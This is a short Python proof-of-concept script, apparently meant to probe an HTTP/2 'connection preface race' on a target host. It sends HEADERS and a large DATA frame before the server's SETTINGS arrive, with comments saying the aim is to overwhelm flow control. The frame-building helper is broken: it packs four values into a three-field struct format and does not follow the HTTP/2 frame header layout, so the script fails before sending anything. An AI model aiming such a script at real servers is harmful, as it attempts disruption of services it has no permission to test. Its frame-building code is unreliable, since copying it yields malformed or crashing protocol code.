#!/usr/bin/env python3
import socket
import struct
import time
import sys

# HTTP/2 Connection Preface
CLIENT_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

# Helper to create an HTTP/2 frame
def create_frame(frame_type, flags, stream_id, payload=b''):
    length = len(payload)
    frame = struct.pack('!IHB', length, frame_type, flags, stream_id & 0x7FFFFFFF)
    return frame + payload

# Helper to create a SETTINGS frame with no settings (empty payload)
def create_settings_frame():
    return create_frame(0x04, 0x00, 0x00, b'')

# Helper to create a HEADERS frame
def create_headers_frame():
    # Minimal HEADERS frame with no headers block for simplicity
    return create_frame(0x01, 0x04, 0x01, b'')  # END_HEADERS flag set

# Helper to create a DATA frame with a large payload
def create_data_frame(size=65535):
    # Create a large payload to potentially overwhelm the server's flow control window
    payload = b'A' * size
    return create_frame(0x00, 0x01, 0x01, payload)  # END_STREAM flag set

def main():
    if len(sys.argv) != 3:
        print("Usage: python poc_http2_connection_preface_race.py <target_host> <target_port>")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = int(sys.argv[2])

    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)  # Set a timeout to avoid hanging indefinitely

    try:
        # Connect to the target server
        print(f"Connecting to {target_host}:{target_port}...")
        sock.connect((target_host, target_port))

        # Send the client connection preface
        print("Sending client connection preface...")
        sock.sendall(CLIENT_PREFACE)

        # Send an empty SETTINGS frame as part of the client preface
        print("Sending empty SETTINGS frame...")
        sock.sendall(create_settings_frame())

        # Immediately send additional frames without waiting for the server's SETTINGS frame
        # This is the core of the race condition
        print("Sending HEADERS frame before receiving server SETTINGS...")
        sock.sendall(create_headers_frame())

        print("Sending large DATA frame before receiving server SETTINGS...")
        sock.sendall(create_data_frame())

        # Wait for a response or timeout
        print("Waiting for server response...")
        try:
            response = sock.recv(4096)
            if response:
                print(f"Received response: {response[:100]}")
            else:
                print("No response received.")
        except socket.timeout:
            print("Timeout waiting for response.")

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()